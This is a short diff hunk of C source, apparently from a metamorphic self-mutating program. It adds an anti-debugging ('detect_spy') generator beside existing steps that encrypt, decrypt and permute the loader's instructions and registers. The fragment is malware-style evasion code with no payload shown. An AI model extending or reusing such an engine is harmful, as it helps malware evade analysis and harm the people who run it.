@@ -56,6 +56,7 @@ bool		metamorph_self(struct safe_ptr clone, size_t loader_off, \
 	// metamorph self and client
 	if (!generate_cypher(cypher, unique_seed, cypher_size)
 	|| !generate_decypher(clone_decypher, unique_seed, cypher_size)
+	|| !generate_detect_spy(clone_detect_spy, unique_seed, detect_spy_size)
 	|| !permutate_instructions(clone_loader_entry, unique_seed, loader_size)
 	|| !permutate_registers(clone_loader_entry, unique_seed, loader_size)
 	|| !permutate_instructions(clone_wrap_mprotect, unique_seed, wrap_mprotect_size)
